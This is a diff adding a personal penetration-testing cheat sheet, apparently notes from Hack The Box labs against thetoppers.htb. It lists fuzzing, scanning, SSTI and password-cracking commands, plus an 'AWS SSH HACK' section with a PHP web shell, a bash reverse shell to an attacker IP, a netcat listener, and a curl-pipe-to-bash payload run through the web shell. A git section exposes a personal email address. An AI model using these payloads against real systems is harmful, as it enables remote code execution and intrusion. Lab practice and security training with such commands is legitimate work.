@@ -1,0 +1,142 @@
+#WRITTEN IN _MARKDOWN_
+
+
+Web-tools
+===============================================================================================================================================
+
+FUZZ
+-----------------------------------------------------------------------------
+    ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://thetoppers.htb/ -H "Host: FUZZ.thetoppers.htb"
+    ffuf  -w "/usr/share/seclists/Discovery/Web-Content/common.txt" -u http://209.97.176.174:30544/admin/FUZZ.html
+         -fs 11952                  -->         Szűrés
+
+NMAP
+-----------------------------------------------------------------------------
+    nmap -T5 -sT 10.129.4.20
+
+
+
+
+CRUNCH
+-----------------------------------------------------------------------------
+    crunch <min> <max> [options]    -->         random word creator
+
+
+GOBUSTER
+-----------------------------------------------------------------------------
+
+    gobuster dir -u 10.129.133.190  -w ~/Hack/gobuster/words.txt
+                                    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+             vhost -u http://thetoppers.htb/ -w 2charwords.txt
+
+
+
+Server Side Tamplate Injection (SSTI)
+-----------------------------------------------------------------------------
+
+  https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs
+
+  1. ${{<%[%'"}}%\
+  2. if error, the server is vulerable
+
+  3. Alternative method:
+
+  TPLMAP
+    python3 ~/Hack/tplmap/tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
+
+
+
+
+
+
+
+
+
+
+
+
+Database-tools
+===============================================================================================================================================
+
+
+
+AWS SSH HACK
+-----------------------------------------------------------------------------
+
+    aws --endpoint=http://s3.thetoppers.htb s3 ls
+    aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+    #We can use the following PHP one-liner which uses the system() function which takes the URL parameter
+    #cmd as an input and executes it as a system command
+    <?php system($_GET["cmd"]); ?>
+
+    #shell.sh
+    #!/bin/bash
+    bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+
+    #ncat listener
+    nc -nvlp 1337
+
+    #directory which reverse shell is in
+    python3 -m http.server 8000
+
+    #We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
+    #in order to execute it. Thus, let us visit the following URL containing the payload in the browser.
+    http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh%20|%20bash
+
+
+
+
+PASSWORD
+===============================================================================================================================================
+
+
+JOHN
+-----------------------------------------------------------------------------
+
+    john --wordlist=~/Hack/Passwords/Common/rockyou.txt hash.txt                    -->         John The Ripper
+
+
+
+
+GITHUB
+===============================================================================================================================================
+
+git config --global user.name gyurci08
+git config --global user.email haver1036@gmail.hu
+git config --global --list
+git init                                                <-- project's folder
+git remote add origin git@gitlab.com:gyurci08/PenetrationTools.git
+git remote -v
+git pull <REMOTE> <name-of-branch>
+git push <remote> <name-of-branch>
+
+REMOTE-CONNECTION
+===============================================================================================================================================
+
+EVIL-WINRM
+-----------------------------------------------------------------------------
+
+    evil-winrm -i [Target_IP] -u administrator -p [cracked_password]
+
+
+
+FUZZ
+-----------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
